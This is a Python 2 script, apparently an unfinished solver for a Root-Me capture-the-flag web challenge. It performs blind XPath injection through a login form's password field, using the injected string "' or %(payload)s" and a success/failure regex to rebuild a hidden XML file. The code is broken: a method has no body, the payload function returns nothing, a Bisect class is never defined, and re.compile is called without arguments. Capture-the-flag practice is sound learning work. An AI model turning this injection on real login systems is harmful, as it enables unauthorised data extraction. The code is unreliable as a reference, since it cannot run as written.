#!/usr/bin/env
import logging

from enum import Enum
from leak.base import Parser, RegexParser
from leak.leak import HTTPLeaker


logging.basicConfig()


class BooleanParser(RegexParser):
    def __init__(self):
        super(BooleanParser, self).__init__(
            pattern=r'((?P<success><h2>Welcome back Steve !</h2>)|(?P<failure>Wrong credentials</p><br/>))'
        )


class ChallengeLeaker(HTTPLeaker):
    '''
    Reconstruct a XML file by blind XPath injection query of a login form.

    The steps are

     - set the node be the root node
     - find how many characters is composed the node name
     - extract the name by bisecting the alphabet
     - find out how many child nodes has
     - repeat the process for all the nodes
    '''
    class State(Enum):
        NODE_NAME_LENGTH  = 0
        NODE_NAME         = 1
        NODE_CHILD_NUMBER = 2

    def __init__(self):
        super(ChallengeLeaker, self).__init__(
            parser=BooleanParser()
        )

        # set the mode to search the name
        self.bisect_state = self.State.NODE_NAME_LENGTH
        # of the root node
        self.bisect_xpath = '/*[1]'

        self.bisect = Bisect

        self.state.update({
            'nodes': [],
        })

    def update(self):


    def get_requests_method(self):
        return 'POST'

    def get_payload(self):
        return

    def get_request_vulnerabile_field_value(self):
        return "' or %(payload)s" % self.get_payload()

    def get_requests_data(self):
        return {
            'username': 'pippo',
            'password': self.get_request_vulnerabile_field_value(),
        }

    def get_requests_params(self):
        return {
            'action': 'login',
        }

    def has_finished(self):
        return False

    def get_requests_url(self):
        return 'http://challenge01.root-me.org/web-serveur/ch23/'



if __name__ == '__main__':
    import re

    v = re.compile()
    #print v.match('miao').groupdict()
    leaker = ChallengeLeaker()

    print leaker()